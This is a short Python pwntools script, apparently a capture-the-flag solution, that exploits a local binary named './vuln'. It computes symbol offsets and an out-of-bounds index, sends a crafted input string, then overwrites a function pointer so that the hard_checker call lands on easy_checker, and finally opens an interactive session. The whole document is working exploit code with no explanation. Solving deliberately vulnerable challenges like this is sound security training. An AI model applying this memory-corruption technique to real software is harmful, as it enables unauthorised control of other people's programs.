from pwn import *
context.clear(arch='i386')
elf = ELF('./vuln')

log.success(f'{hex(elf.sym.easy_checker)=}')
log.success(f'{hex(elf.sym.hard_checker)=}')
log.success(f'{hex(elf.sym.check)=}')
log.success(f'{hex(elf.sym.fun)=}')
log.success(f'{hex(elf.sym.vuln)=}')

diff_checker = elf.sym.easy_checker - elf.sym.hard_checker
diff_addr = (elf.sym.check - elf.sym.fun) // 4

log.success(f'dest function diff {diff_checker}')
log.success(f'overwrite idx {diff_addr}')
p = process('./vuln')
p.recvuntil(b"Tell me a story and then I'll tell you if you're a 1337 >> ")
payload = chr(100)*13 + chr(37)
p.sendline(payload.encode())
p.recvline()

p.sendline(f'{diff_addr} {diff_checker}'.encode())
p.interactive()
